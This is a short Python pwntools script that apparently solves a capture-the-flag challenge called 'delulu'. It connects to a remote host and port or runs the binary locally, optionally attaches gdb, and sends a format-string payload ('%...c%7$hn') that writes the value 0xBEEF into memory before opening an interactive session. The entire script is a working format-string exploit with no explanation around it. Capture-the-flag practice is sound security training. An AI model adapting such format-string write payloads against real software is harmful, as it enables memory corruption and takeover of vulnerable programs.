from pwn import *

if args.REMOTE:
    io=remote('94.237.62.244', 43709)
else:
    io = process('./delulu')
    if args.GDB:
        cmd="""
        b* main+129
        """
        gdb.attach(io, cmd)
        
pause()
io.sendline('%{}c%7$hn'.format(0xBEEF).encode())
io.interactive()